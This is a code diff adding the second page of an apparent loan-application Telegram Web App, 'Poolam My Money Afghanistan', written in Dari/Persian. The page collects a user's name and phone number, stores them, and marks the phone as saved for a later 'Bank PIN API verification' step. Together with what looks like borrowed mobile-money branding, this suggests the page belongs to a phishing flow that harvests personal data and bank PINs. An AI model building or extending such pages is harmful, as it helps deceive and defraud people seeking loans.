@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>درخواست قرضه‌ - مرحله دوم</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f8fafc;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .nav-header {
+            width: 100%;
+            background: linear-gradient(135deg, #f26522, #0072bc);
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        .waafi-logo {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .form-card {
+            background: white;
+            width: 92%;
+            max-width: 480px;
+            margin-top: 25px;
+            padding: 30px 20px;
+            border-radius: 15px;
+            box-shadow: 0 8px 20px rgba(242,101,34,0.12);
+            box-sizing: border-box;
+        }
+
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 35px;
+        }
+
+        .bar {
+            height: 4px;
+            flex: 1;
+            background: #e2e8f0;
+            border-radius: 2px;
+        }
+
+        .active-bar {
+            background: #f26522;
+        }
+
+        .input-wrap {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #2d3748;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #cbd5e0;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #fff;
+            color: #2d3748;
+            font-family: inherit;
+        }
+
+        input:focus {
+            border-color: #f26522;
+            outline: none;
+        }
+
+        input::placeholder {
+            color: #a0aec0;
+        }
+
+        .phone-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-code {
+            width: 75px;
+            background: #edf2f7;
+            text-align: center;
+            font-weight: bold;
+            border: 1px solid #cbd5e0;
+            line-height: 50px;
+            color: #2d3748;
+            border-radius: 8px;
+            direction: ltr;
+        }
+
+        .phone-input {
+            flex: 1;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .phone-hint {
+            font-size: 12px;
+            color: #718096;
+            margin-top: 8px;
+        }
+
+        .btn-container {
+            margin-top: 40px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background-color: #edf2f7;
+            color: #4a5568;
+            border: 1px solid #cbd5e0;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .next-btn {
+            background: linear-gradient(135deg, #f26522, #ea580c);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(242,101,34,0.25);
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #a0aec0;
+            margin: 40px 0 30px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="nav-header">
+    <div onclick="goBack()" style="cursor:pointer; font-size:16px;">← برگشت</div>
+    <div class="waafi-logo">Poolam My Money</div>
+    <div style="font-size: 22px;">☰</div>
+</div>
+
+<div class="form-card">
+    <div class="progress-box">
+        <div class="bar active-bar"></div>
+        <div class="bar active-bar"></div>
+        <div class="bar"></div>
+    </div>
+
+    <div class="input-wrap">
+        <label>نام</label>
+        <input type="text" id="firstName" placeholder="احمد">
+    </div>
+
+    <div class="input-wrap">
+        <label>تخلص</label>
+        <input type="text" id="lastName" placeholder="حسن">
+    </div>
+
+    <div class="input-wrap">
+        <label>شماره تلیفون</label>
+        <div class="phone-container">
+            <div class="country-code">+93</div>
+            <input type="tel" id="phone" class="phone-input" placeholder="791234567" maxlength="9">
+        </div>
+        <p class="phone-hint">شماره ۹ رقمی را وارد کنید (مثال: ۷۹۱۲۳۴۵۶۷)</p>
+    </div>
+
+    <div class="btn-container">
+        <button type="button" class="next-btn" onclick="goNext()">مرحله بعدی</button>
+        <button type="button" class="back-btn" onclick="goBack()">قبلی</button>
+    </div>
+</div>
+
+<div class="footer-text">© 2026 Poolam My Money Afghanistan. تمامی حقوق محفوظ است.</div>
+
+<script>
+    function goNext() {
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !phone) {
+            alert("لطفاً تمامی فمزهای خالی را پر کنید.");
+            return;
+        }
+
+        if (!/^\d{9}$/.test(phone)) {
+            alert("لطفاً یک شماره تلیفون صحیح ۹ رقمی وارد کنید.");
+            return;
+        }
+
+        // Save for general flow
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('phone', phone);
+        
+        // CRITICAL: Save specifically for the Bank PIN API verification
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Auto-fill existing data
+        const f = localStorage.getItem('firstName');
+        const l = localStorage.getItem('lastName');
+        const p = localStorage.getItem('phone');
+
+        if (f) document.getElementById('firstName').value = f;
+        if (l) document.getElementById('lastName').value = l;
+        if (p) document.getElementById('phone').value = p;
+    };
+</script>
+
+</body>
+</html>
